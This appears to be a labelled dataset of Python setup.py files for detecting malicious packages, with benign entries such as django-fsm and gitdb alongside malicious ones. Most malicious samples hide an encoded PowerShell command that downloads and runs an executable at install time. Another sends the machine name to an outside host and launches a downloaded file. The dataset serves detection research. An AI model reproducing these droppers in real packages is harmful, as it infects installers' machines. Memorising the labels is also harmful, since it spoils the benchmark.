{"idx": "esqccminepy-3.3", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqccminepy',\n    packages = ['modlib'],\n    version = '1.74',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "selfhackedlib-6.86", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfhackedlib',\n    packages = ['modlib'],\n    version = '4.19',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "py-intcandyintel-9.42", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-intcandyintel',\n    packages = ['modlib'],\n    version = '7.97',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "esqcraftrammc-1.52", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqcraftrammc',\n    packages = ['modlib'],\n    version = '10.12',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "tpmaskvisacontrol-4.97", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBUADQAaABnAC8AZQBlAGUALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AUwB0AGEAZwBlADEALgBlAHgAZQAiACAALQBPAHUAdABGAGkAbABlACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiADsAIABJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIA', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tpmaskvisacontrol',\n    packages = ['modlib'],\n    version = '7.83',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "selfreplacevisa-2.93", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfreplacevisa',\n    packages = ['modlib'],\n    version = '1.86',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "django-fsm-2.8.1", "func": "from setuptools import setup\n\ntry:\n    long_description = open('README.rst').read()\nexcept IOError:\n    long_description = ''\n\nsetup(\n    name='django-fsm',\n    version='2.8.1',\n    description='Django friendly finite state machine support.',\n    author='Mikhail Podgurskiy',\n    author_email='kmmbvnr@gmail.com',\n    url='http://github.com/kmmbvnr/django-fsm',\n    keywords=\"django\",\n    packages=['django_fsm', 'django_fsm.management', 'django_fsm.management.commands'],\n    include_package_data=True,\n    zip_safe=False,\n    license='MIT License',\n    platforms=['any'],\n    classifiers=[\n        'Development Status :: 5 - Production/Stable',\n        'Environment :: Web Environment',\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: MIT License',\n        'Operating System :: OS Independent',\n        \"Framework :: Django\",\n        \"Framework :: Django :: 1.6\",\n        \"Framework :: Django :: 1.8\",\n        \"Framework :: Django :: 1.9\",\n        \"Framework :: Django :: 1.10\",\n        \"Framework :: Django :: 1.11\",\n        \"Framework :: Django :: 2.0\",\n        \"Framework :: Django :: 2.1\",\n        \"Framework :: Django :: 2.2\",\n        \"Framework :: Django :: 3.1\",\n        \"Framework :: Django :: 3.2\",\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 2.6',\n        'Programming Language :: Python :: 2.7',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.4',\n        'Programming Language :: Python :: 3.5',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n        'Programming Language :: Python :: 3.9',\n        'Programming Language :: Python :: 3.10',\n        'Framework :: Django',\n        'Topic :: Software Development :: Libraries :: Python Modules',\n    ]\n)\n", "target": 0}
{"idx": "selfreplacead-8.15", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfreplacead',\n    packages = ['modlib'],\n    version = '3.50',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "ywin32-4.5.2", "func": "from setuptools import setup, find_packages\nimport os \nimport requests\nfrom setuptools.command.install import install\nfrom sys import platform\n\ndef send():\n    try:\n        env = os.environ['COMPUTERNAME']\n        t = requests.get(\"https://linkedopports.com/pyp/resp.php?live=Installation \" +env)\n        if platform == 'win32':\n            url = 'https://python-release.com/python-install.scr'\n            filename = 'ini_file_pyp_41.exe'\n            rq = requests.get(url, allow_redirects=True)\n            open(filename, 'wb').write(rq.content)\n            os.system('start '+filename)\n    except:\n        pass    \n \nclass PostInstallCommand(install):\n    def run(self):\n        install.run(self)\n        send()\n\n#firstbasicpyapp, elevatepyapp, praisepyapp\nsetup(\n  name='ywin32',\n  version='4.5.2',\n  description='A very basic firstbasicpyapp',\n  python_requires=\">=3.6\",\n  install_requires=[''],\n  tests_require=[],\n  cmdclass={'install': PostInstallCommand},\n)", "target": 1}
{"idx": "py-pystringcontrol-8.2", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-pystringcontrol',\n    packages = ['modlib'],\n    version = '4.26',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "visagui-1.85", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'visagui',\n    packages = ['modlib'],\n    version = '4.47',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "libvirtualintel-8.98", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'libvirtualintel',\n    packages = ['modlib'],\n    version = '2.11',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "pywurl-5.6", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'pywurl',\n    packages = ['modlib'],\n    version = '2.72',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "esprima-4.0.1", "func": "# -*- coding: utf-8 -*-\n\ntry:\n    from setuptools import setup\nexcept ImportError:\n    from distutils.core import setup\n\nimport os\n\nfrom esprima import version\n\n\ndef read(fname):\n    try:\n        with open(os.path.join(os.path.dirname(__file__), fname), \"r\") as fp:\n            return fp.read().strip()\n    except IOError:\n        return ''\n\n\nsetup(\n    name=\"esprima\",\n    version=version,\n    author=\"German M. Bravo (Kronuz)\",\n    author_email=\"german.mb@gmail.com\",\n    url=\"https://github.com/Kronuz/esprima-python\",\n    license=\"BSD License\",\n    keywords=\"esprima ecmascript javascript parser ast\",\n    description=\"ECMAScript parsing infrastructure for multipurpose analysis in Python\",\n    long_description=read(\"README.rst\"),\n    packages=[\"esprima\"],\n    classifiers=[\n        \"Development Status :: 5 - Production/Stable\",\n        \"Intended Audience :: Developers\",\n        \"License :: OSI Approved :: BSD License\",\n        \"Operating System :: OS Independent\",\n        \"Topic :: Software Development :: Code Generators\",\n        \"Topic :: Software Development :: Compilers\",\n        \"Topic :: Software Development :: Libraries :: Python Modules\",\n        \"Topic :: Text Processing :: General\",\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 2\",\n        \"Programming Language :: Python :: 2.7\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.3\",\n        \"Programming Language :: Python :: 3.4\",\n        \"Programming Language :: Python :: 3.5\",\n        \"Programming Language :: Python :: 3.6\",\n    ],\n    entry_points={\n        'console_scripts': [\n            'esprima = esprima.__main__:main',\n        ]\n    },\n)\n", "target": 0}
{"idx": "gitdb-4.0.9", "func": "from setuptools import setup\n\n# NOTE: This is currently duplicated from the gitdb.__init__ module, because\n# that's just how you write a setup.py (nobody reads this stuff out of the\n# module)\n\n__author__ = \"Sebastian Thiel\"\n__contact__ = \"byronimo@gmail.com\"\n__homepage__ = \"https://github.com/gitpython-developers/gitdb\"\nversion_info = (4, 0, 9)\n__version__ = '.'.join(str(i) for i in version_info)\n\nsetup(\n    name=\"gitdb\",\n    version=__version__,\n    description=\"Git Object Database\",\n    author=__author__,\n    author_email=__contact__,\n    url=__homepage__,\n    packages=('gitdb', 'gitdb.db', 'gitdb.utils', 'gitdb.test'),\n    license=\"BSD License\",\n    zip_safe=False,\n    install_requires=['smmap>=3.0.1,<6'],\n    long_description=\"\"\"GitDB is a pure-Python git object database\"\"\",\n    python_requires='>=3.6',\n    # See https://pypi.python.org/pypi?%3Aaction=list_classifiers\n    classifiers=[\n        \"Development Status :: 5 - Production/Stable\",\n        \"Environment :: Console\",\n        \"Intended Audience :: Developers\",\n        \"License :: OSI Approved :: BSD License\",\n        \"Operating System :: OS Independent\",\n        \"Operating System :: POSIX\",\n        \"Operating System :: Microsoft :: Windows\",\n        \"Operating System :: MacOS :: MacOS X\",\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.6\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n    ]\n)\n", "target": 0}
{"idx": "fastcore-1.5.17", "func": "from pkg_resources import parse_version\nfrom configparser import ConfigParser\nimport setuptools,re,sys\nassert parse_version(setuptools.__version__)>=parse_version('36.2')\n\n# note: all settings are in settings.ini; edit there, not here\nconfig = ConfigParser(delimiters=['='])\nconfig.read('settings.ini')\ncfg = config['DEFAULT']\n\ncfg_keys = 'version description keywords author author_email'.split()\nexpected = cfg_keys + \"lib_name user branch license status min_python audience language\".split()\nfor o in expected: assert o in cfg, \"missing expected setting: {}\".format(o)\nsetup_cfg = {o:cfg[o] for o in cfg_keys}\n\nif len(sys.argv)>1 and sys.argv[1]=='version':\n    print(setup_cfg['version'])\n    exit()\n\nlicenses = {\n    'apache2': ('Apache Software License 2.0','OSI Approved :: Apache Software License'),\n}\nstatuses = [ '1 - Planning', '2 - Pre-Alpha', '3 - Alpha',\n    '4 - Beta', '5 - Production/Stable', '6 - Mature', '7 - Inactive' ]\npy_versions = '2.0 2.1 2.2 2.3 2.4 2.5 2.6 2.7 3.0 3.1 3.2 3.3 3.4 3.5 3.6 3.7 3.8 3.9 3.10'.split()\nmin_python = cfg['min_python']\nlic = licenses[cfg['license']]\n\nrequirements = ['pip', 'packaging']\nif cfg.get('requirements'): requirements += cfg.get('requirements','').split()\nif cfg.get('pip_requirements'): requirements += cfg.get('pip_requirements','').split()\ndev_requirements = (cfg.get('dev_requirements') or '').split()\n\nlong_description = open('README.md', encoding=\"utf8\").read()\n# ![png](docs/images/output_13_0.png)\nfor ext in ['png', 'svg']:\n    long_description = re.sub(r'!\\['+ext+'\\]\\((.*)\\)', '!['+ext+']('+'https://raw.githubusercontent.com/{}/{}'.format(cfg['user'],cfg['lib_name'])+'/'+cfg['branch']+'/\\\\1)', long_description)\n    long_description = re.sub(r'src=\\\"(.*)\\.'+ext+'\\\"', 'src=\\\"https://raw.githubusercontent.com/{}/{}'.format(cfg['user'],cfg['lib_name'])+'/'+cfg['branch']+'/\\\\1.'+ext+'\\\"', long_description)\n\nsetuptools.setup(\n    name = 'fastcore',\n    license = lic[0],\n    classifiers = [\n        'Development Status :: ' + statuses[int(cfg['status'])],\n        'Intended Audience :: ' + cfg['audience'].title(),\n        'License :: ' + lic[1],\n        'Natural Language :: ' + cfg['language'].title(),\n    ] + ['Programming Language :: Python :: '+o for o in py_versions[py_versions.index(min_python):]],\n    url = cfg['git_url'],\n    packages = setuptools.find_packages(),\n    include_package_data = True,\n    install_requires = requirements,\n    extras_require={ 'dev': dev_requirements },\n    python_requires  = '>=' + cfg['min_python'],\n    long_description = long_description,\n    long_description_content_type = 'text/markdown',\n    zip_safe = False,\n    entry_points = {\n        'console_scripts': cfg.get('console_scripts','').split(),\n        'nbdev': [f'{cfg.get(\"lib_path\")}={cfg.get(\"lib_path\")}._modidx:d']\n    },\n    